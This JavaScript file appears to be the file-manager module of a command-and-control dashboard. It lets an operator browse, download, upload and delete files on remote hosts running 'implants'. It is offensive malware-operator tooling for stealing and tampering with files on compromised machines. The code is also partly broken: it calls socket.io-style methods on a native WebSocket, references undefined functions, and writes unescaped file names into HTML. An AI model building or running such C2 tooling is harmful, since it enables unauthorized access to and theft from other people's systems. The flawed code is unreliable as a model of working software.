// File Manager Module
const FileManager = {
    socket: null,
    selectedImplant: null,
    currentPath: '/',
    fileList: [],

    init(socket) {
        this.socket = socket;
        this.setupEventListeners();
    },

    setupEventListeners() {
        // Navigation buttons
        document.getElementById('navigate-up').addEventListener('click', () => this.navigateUp());
        document.getElementById('refresh-files').addEventListener('click', () => this.refreshFiles());
        document.getElementById('navigate-path').addEventListener('click', () => this.navigateToPath());

        // Path input
        document.getElementById('path-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.navigateToPath();
            }
        });

        // Socket event listeners
        this.socket.on('file_list', this.handleFileList.bind(this));
        this.socket.on('file_download', this.handleFileDownload.bind(this));
        this.socket.on('file_upload_complete', this.handleFileUploadComplete.bind(this));
    },

    selectImplant(implantId) {
        this.selectedImplant = implantId;
        this.currentPath = '/';
        this.refreshFiles();
    },

    navigateUp() {
        if (this.currentPath === '/') return;
        
        const pathParts = this.currentPath.split('/').filter(Boolean);
        pathParts.pop();
        this.currentPath = pathParts.length ? '/' + pathParts.join('/') : '/';
        
        this.refreshFiles();
    },

    navigateToPath() {
        const pathInput = document.getElementById('path-input');
        const newPath = pathInput.value.trim();
        
        if (!newPath) {
            dashboard.showNotification('Please enter a valid path', 'warning');
            return;
        }

        this.currentPath = newPath.startsWith('/') ? newPath : '/' + newPath;
        this.refreshFiles();
    },

    refreshFiles() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        document.getElementById('path-input').value = this.currentPath;
        
        this.socket.emit('get_files', {
            implant_id: this.selectedImplant,
            path: this.currentPath
        });
    },

    handleFileList(data) {
        this.fileList = data.files;
        const fileList = document.getElementById('file-list');
        fileList.innerHTML = '';

        // Add parent directory entry if not at root
        if (this.currentPath !== '/') {
            const parentRow = document.createElement('tr');
            parentRow.innerHTML = `
                <td>
                    <i class="fas fa-level-up-alt"></i>
                    ..
                </td>
                <td>-</td>
                <td>-</td>
                <td>
                    <button class="btn btn-sm btn-primary" onclick="FileManager.navigateUp()">
                        <i class="fas fa-level-up-alt"></i> Up
                    </button>
                </td>
            `;
            fileList.appendChild(parentRow);
        }

        // Add files and directories
        this.fileList.forEach(file => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>
                    <i class="fas ${file.type === 'directory' ? 'fa-folder' : 'fa-file'}"></i>
                    ${file.name}
                </td>
                <td>${file.type === 'directory' ? '-' : dashboard.formatBytes(file.size)}</td>
                <td>${dashboard.formatDate(file.modified)}</td>
                <td>
                    ${this.getFileActions(file)}
                </td>
            `;
            fileList.appendChild(row);
        });
    },

    getFileActions(file) {
        if (file.type === 'directory') {
            return `
                <button class="btn btn-sm btn-primary" onclick="FileManager.navigateToDirectory('${file.path}')">
                    <i class="fas fa-folder-open"></i> Open
                </button>
            `;
        }

        return `
            <div class="btn-group">
                <button class="btn btn-sm btn-primary" onclick="FileManager.downloadFile('${file.path}')">
                    <i class="fas fa-download"></i> Download
                </button>
                <button class="btn btn-sm btn-danger" onclick="FileManager.deleteFile('${file.path}')">
                    <i class="fas fa-trash"></i> Delete
                </button>
            </div>
        `;
    },

    navigateToDirectory(path) {
        this.currentPath = path;
        this.refreshFiles();
    },

    downloadFile(path) {
        if (!this.selectedImplant) return;

        this.socket.emit('download_file', {
            implant_id: this.selectedImplant,
            path: path
        });
    },

    handleFileDownload(data) {
        const blob = new Blob([data.content], { type: 'application/octet-stream' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = data.filename;
        a.click();
        window.URL.revokeObjectURL(url);
        
        dashboard.showNotification('File downloaded successfully', 'success');
    },

    uploadFile(file) {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        const reader = new FileReader();
        reader.onload = (e) => {
            this.socket.emit('upload_file', {
                implant_id: this.selectedImplant,
                path: this.currentPath + '/' + file.name,
                content: e.target.result
            });
        };
        reader.readAsArrayBuffer(file);
    },

    handleFileUploadComplete(data) {
        dashboard.showNotification('File uploaded successfully', 'success');
        this.refreshFiles();
    },

    deleteFile(path) {
        if (!this.selectedImplant) return;

        if (confirm('Are you sure you want to delete this file?')) {
            this.socket.emit('delete_file', {
                implant_id: this.selectedImplant,
                path: path
            });
        }
    }
};

// Initialize when document is ready
document.addEventListener('DOMContentLoaded', () => {
    // Initialize WebSocket connection
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const socket = new WebSocket(`${protocol}//${window.location.host}/ws/dashboard`);

    // Handle WebSocket messages
    socket.onmessage = (event) => {
        const data = JSON.parse(event.data);
        if (data.type === 'file_list') {
            updateFileList(data.files);
        } else if (data.type === 'file_content') {
            handleFileContent(data);
        }
    };

    FileManager.init(socket);
}); 